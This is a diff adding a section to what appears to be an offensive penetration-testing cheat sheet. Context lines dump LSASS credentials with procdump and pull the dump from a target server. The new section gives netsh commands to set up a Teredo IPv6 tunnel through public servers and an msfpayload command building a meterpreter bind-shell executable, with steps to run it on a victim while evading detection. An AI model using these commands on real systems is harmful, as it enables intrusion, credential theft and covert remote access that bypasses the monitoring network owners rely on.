@@ -185,3 +185,28 @@ procdump.exe -ma lsass creds.dump
 at \\targetserver 13:37 C:\procdump.bat
 copy \\targetserver\c$\targetserver.dmp .
 ```
+
+### Teredo IPv6 Bindshell
+Creating a teredo tunnel to allow a remote victim to tunnel IPv6 packets over IPv4 may allow you to evade some
+filter detection systems and extract information from a victim without triggering alerts on the target network.
+
+In order to do this one needs to use a teredo server which will convert IPv4 packets to IPv6 packets and vice versa.
+Several publicly available servers are available including:
+
+* teredo.trex.fi
+* teredo.remlab.net
+* teredo-debian.remlab.net
+* teredo.ngix.ne.kr
+* win8.ipv6.microsoft.com (This may be shaky on Windows 7, so don't rely on it)
+
+To set up a tunnel, issue the following commands:
+
+```
+netsh interface ipv6 install
+netsh interface ipv6 teredo enterpriseclient
+netsh interface ipv6 teredo set client teredo.trex.fi
+msfpayload windows/meterpreter/bind_ipv6_tcp LPORT=5555 X > bind.exe
+```
+
+All we have to do at this point is upload the resulting bind.exe payload to the victim, execute it, and then set up
+metasploit to connect to the public IPv6 address that the victim was assigned on the specified port (5555 in this example), and we should now be able to get a meterpreter shell using teredo tunneling :)
